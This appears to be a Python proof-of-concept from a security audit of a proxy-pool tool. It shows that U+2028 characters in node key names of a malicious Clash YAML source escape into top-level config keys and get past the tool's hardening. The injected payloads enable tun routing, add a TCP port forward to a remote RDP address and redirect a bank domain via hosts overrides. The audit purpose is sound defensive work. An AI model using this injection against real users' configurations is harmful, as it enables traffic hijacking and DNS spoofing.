# -*- coding: utf-8 -*-
"""
问题 3 验证: 恶意 Clash YAML 源 -> 节点键名 -> build_clash 产物 YAML 顶层注入。

原理:
  pool._CTRL_RE = [\x00-\x1f\x7f] 只清 ASCII 控制符。
  U+2028 / U+2029 / U+0085 不被 scrub 清掉, 却被 YAML 读取端当作换行。
  _yaml_lines 输出键名时形如 f"{pad}{k}:" —— 键名不加引号、不转义,
  键名里的 U+2028 于是变成真实换行, 逃逸出 proxies 段。
源里必须用 YAML 双引号转义 \\u2028 写入 (字面 U+2028 会被读取端折叠成空格)。
"""
import json
import pathlib
import subprocess
import sys
import time

sys.path.insert(0, r"E:\AI\freeVPN")
import yaml
import pool
import security as sec

ROOT = pathlib.Path(r"E:\AI\freeVPN")
WORK = ROOT / "audit" / "_miwork"
WORK.mkdir(parents=True, exist_ok=True)


def evil_key(block: list[str]) -> str:
    """返回键名 (Python 字符串, 内含真实 U+2028)。block[0] 需自身是合法映射项。"""
    return "\u2028".join(block) + "\u2028" + "  #"


def esc_key(block: list[str]) -> str:
    """返回写进源 YAML 双引号标量里的转义写法。"""
    return evil_key(block).replace("\\", "\\\\").replace('"', '\\"').replace(
        "\u2028", "\\u2028")


def build_source(block: list[str]) -> str:
    return (
        "proxies:\n"
        '  - name: "evil-node"\n'
        "    type: vmess\n"
        "    server: 1.2.3.4\n"
        "    port: 443\n"
        "    uuid: 11111111-2222-3333-4444-555555555555\n"
        "    alterId: 0\n"
        "    cipher: auto\n"
        "    tls: true\n"
        f'    "{esc_key(block)}": "1"\n'
    )


def run_mihomo(cfg_path: pathlib.Path):
    r = subprocess.run([str(ROOT / "bin" / "mihomo.exe"), "-d", str(WORK),
                        "-f", str(cfg_path), "-t"],
                       capture_output=True, text=True, encoding="utf-8",
                       errors="replace", cwd=str(WORK), timeout=120)
    txt = ((r.stdout or "") + (r.stderr or "")).strip()
    return r.returncode, txt[-600:]


def case(title: str, block: list[str], top_key: str):
    print("=" * 78)
    print(f"### {title}")
    print("=" * 78)
    src = build_source(block)
    print("--- 攻击者源 YAML 片段 ---")
    print(src.split("    tls: true\n")[1].rstrip())

    raw = pool.parse_any(src)
    nodes = pool.dedupe(raw)
    kept, rep = sec.audit_pool(nodes)
    print(f"--- parse_any={len(raw)} dedupe={len(nodes)} 审计放行={len(kept)} "
          f"拦截={rep.blocked} 告警={rep.warned} ---")
    if not kept:
        print("!! 链断")
        return
    print("--- 审计放行节点的键名 (repr) ---")
    for k in kept[0]:
        print("   ", repr(k)[:150])

    out = pool.build_clash(kept, "POC")
    body = "\n".join(out.splitlines()[3:])
    loaded = yaml.safe_load(body)
    print("--- 产物 YAML 反解顶层键 ---")
    print("   ", sorted(loaded.keys()))
    print(f"--- 目标顶层键 {top_key!r} 是否出现: {top_key in loaded} ---")
    if top_key in loaded:
        print(f"    {top_key} = {json.dumps(loaded[top_key], ensure_ascii=False)}")

    tmp = ROOT / "audit" / f"_poc_{top_key}.yaml"
    tmp.write_text(out, encoding="utf-8")
    rc, log = run_mihomo(tmp)
    print(f"--- mihomo -t (产物) 退出码 {rc} ---")
    print("   ", log.replace("\n", "\n    "))
    print()


def case_d_harden_bypass():
    """D. 走 _write_kernel_config 的同款路径: harden_kernel_config 先 pop 掉 tun,
    再由 _dump_yaml 序列化 —— 注入在序列化阶段发生, 于是 tun 又回来了。"""
    print("=" * 78)
    print("### D. 绕过 harden_kernel_config (内核配置侧, 本机实际加载的那份)")
    print("=" * 78)
    src = build_source(["x: 1", "tun:", "  enable: true", "  stack: system",
                        "  auto-route: true", "  auto-detect-interface: true"])
    raw = pool.parse_any(src)
    nodes = pool.dedupe(raw)
    kept, rep = sec.audit_pool(nodes)
    print(f"--- 审计: 放行 {len(kept)}, 拦截 {rep.blocked} ---")

    # 复刻 pool._write_kernel_config 的字典与收口顺序 (不写项目 state/ 目录)
    proxies = [{k: v for k, v in n.items() if not k.startswith("_")} for n in kept]
    proxies[0]["name"] = "n00000"
    cfg = {
        "mixed-port": 17890, "allow-lan": False, "mode": "rule",
        "log-level": "silent", "ipv6": False,
        "external-controller": "127.0.0.1:19090", "secret": "freevpn",
        "unified-delay": True, "tcp-concurrent": True, "find-process-mode": "off",
        "profile": {"store-selected": False, "store-fake-ip": False},
        "proxies": proxies, "rules": ["MATCH,DIRECT"],
    }
    print(f"--- harden_kernel_config 之前 cfg 里有 tun 吗: {'tun' in cfg} ---")
    cfg = sec.harden_kernel_config(cfg, "freevpn")
    print(f"--- harden_kernel_config 之后 cfg 里有 tun 吗: {'tun' in cfg}  "
          f"(被 pop, 收口生效) ---")
    text = pool._dump_yaml(cfg)
    loaded = yaml.safe_load(text)
    print(f"--- 序列化后反解, tun 是否复活: {'tun' in loaded} -> {loaded.get('tun')} ---")
    tmp = ROOT / "audit" / "_poc_kernel.yaml"
    tmp.write_text(text, encoding="utf-8")
    rc, log = run_mihomo(tmp)
    print(f"--- mihomo -t (内核配置) 退出码 {rc} ---")
    print("   ", log.replace("\n", "\n    "))

    # 真正启动一次, 看内核是否按注入的 tun 去建设备。
    # 注意: harden_kernel_config 会把 log-level 压成 silent, 为了拿到运行期日志,
    # 这里仅在本用例里把它抬回 debug —— 注入的 tun 段与日志级别无关。
    cfg2 = dict(cfg)
    cfg2["log-level"] = "debug"
    tmp2 = ROOT / "audit" / "_poc_kernel_dbg.yaml"
    tmp2.write_text(pool._dump_yaml(cfg2), encoding="utf-8")
    logf = ROOT / "audit" / "_poc_kernel_run.log"
    with open(logf, "wb") as fh:
        proc = subprocess.Popen([str(ROOT / "bin" / "mihomo.exe"), "-d", str(WORK),
                                 "-f", str(tmp2)],
                                stdout=fh, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL,
                                cwd=str(WORK), creationflags=0x08000000)
        time.sleep(8)
        alive = proc.poll() is None
        proc.kill()
        proc.wait(timeout=10)
    print(f"--- 启动 8 秒后内核仍存活: {alive} (配置被接受) ---")
    text_log = logf.read_text(encoding="utf-8", errors="replace")
    print("--- 运行期日志中与 tun / 注入相关的行 ---")
    hits = [ln for ln in text_log.splitlines()
            if any(w in ln.lower() for w in ("tun", "auto-route", "interface",
                                             "13389", "hosts", "sniffer"))]
    for ln in hits[:25]:
        print("   ", ln.strip()[:210])
    if not hits:
        print("    (无匹配行; 原始日志尾部)")
        for ln in text_log.splitlines()[-12:]:
            print("   ", ln.strip()[:210])
    print()


if __name__ == "__main__":
    case("A. 注入 tun —— harden_kernel_config 明确 pop 掉的键",
         ["x: 1", "tun:", "  enable: true", "  stack: system", "  auto-route: true",
          "  auto-detect-interface: true"], "tun")
    case("B. 注入 tunnels —— 内核自带任意 TCP 端口转发",
         ["x: 1", "tunnels:", "  - tcp,0.0.0.0:13389,1.2.3.4:3389"], "tunnels")
    case("C. 注入 hosts —— 绕过分流规则做 DNS 覆盖",
         ["x: 1", "hosts:", "  '+.icbc.com.cn': 1.2.3.4", "sniffer:", "  enable: true"],
         "hosts")
    case_d_harden_bypass()
